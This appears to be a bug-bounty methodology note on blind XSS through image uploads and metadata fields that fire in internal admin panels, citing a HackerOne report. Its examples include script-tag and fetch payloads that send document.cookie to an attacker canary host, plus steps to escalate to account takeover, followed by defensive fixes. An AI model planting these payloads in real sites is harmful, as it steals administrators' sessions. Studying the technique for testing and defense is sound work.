---
name: xss-blind-image-upload
description: Blind XSS via image upload — payload fires later in an internal admin/review panel you can't see. Teaches blind XSS methodology, exif/metadata injection, and payload-hosted canary callbacks.
sources: hackerone_public
report_count: 1
---

# Blind XSS via image upload

**Report**: CS Money — "Blind XSS on image upload" (hackerone.com/reports/1010466, critical, $1,000, Stored XSS). See also Twitter internal panel blind XSS (#1207040).

## Why it matters (the new lesson)
Stored XSS doesn't have to fire in *your* browser. If your payload (in a username, filename, image EXIF, or upload) is later rendered by an **internal admin/moderator/ticketing panel** you can't access, it executes there — often with higher privileges (admin sessions, internal tools). You detect it out-of-band: your payload phones home to a Collaborator domain.

## How it works
Inject a payload with a callback into any field an admin will view:
```html
"><script src="https://YOUR-CANARY.burpcollaborator.net/x"></script>
<script>new Image().src='https://YOUR-CANARY/'+document.domain+'/'+document.cookie</script>
```
When an admin's browser renders it, your Collaborator receives a hit + leaked domain/cookie (unless HttpOnly).

## How to hunt for it
1. Enumerate every stored input: names, tickets, chat, file metadata, uploads, comments.
2. Inject `<script src=//CANARY>` plus `fetch('//CANARY/?c='+document.cookie)`.
3. Wait hours/days; poll Collaborator/interactsh for hits — the `document.domain` tells you WHICH panel executed it.
4. Escalate: if the panel is same-origin as the app, chain to full ATO.

## Tooling
Burp Collaborator / `interactsh-client` / XSS Hunter. Keep a long-lived canary subdomain.

## Fix
HTML-encode all stored user input at render; separate admin panel origin; strict CSP; `HttpOnly`+`SameSite` cookies.
